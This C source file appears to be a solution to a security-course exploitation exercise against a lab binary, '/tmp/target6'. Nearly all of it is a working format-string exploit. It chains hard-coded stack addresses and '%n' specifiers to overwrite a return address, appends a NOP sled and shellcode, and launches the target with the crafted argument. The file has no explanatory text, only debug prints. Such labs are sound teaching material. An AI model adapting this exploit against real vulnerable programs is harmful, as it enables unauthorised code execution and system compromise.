#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define TARGET "/tmp/target6"


int main(int argc, char* argv[])
{
  char *args[3];
  char *env[1];
  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;

char* overWriteAddrSection = "\xec\xfd\xff\xbfjunk\xed\xfd\xff\xbfjunk\xee\xfd\xff\xbfjunk\xef\xfd\xff\xbf%4x%4x%118x%n%349x%n%2560x%n%192x%n";
char noOps[40];
memset(noOps,0x90,40);
noOps[39] = '\0';

char attackString[256];
memset(attackString,0x90,256);
strcpy(attackString,overWriteAddrSection);
strcat(attackString,noOps);
strcat(attackString,shellcode);

printf("formatString length: %d\n",strlen(overWriteAddrSection));
printf("shellcode length: %d\n",strlen(shellcode));
printf("Attackstring length: %d\n",strlen(attackString));
printf("Content is: %s\n",attackString);
printf("Strlen is: %d\n",strlen(attackString));
args[1] = attackString; 
//char shellcodebuf[100];
//memset(shellcodebuf,0x90,100);
//strcat(shellcodebuf,"SHELLCODE2=");
//strcat(shellcodebuf,shellcode);
//env[0] = shellcodebuf;
//env[1] = NULL;
env[0] = NULL;
printf("Calling target\n");

if (0 > execve(TARGET, args, env))
  fprintf(stderr, "execve failed.\n");
return 0;

}
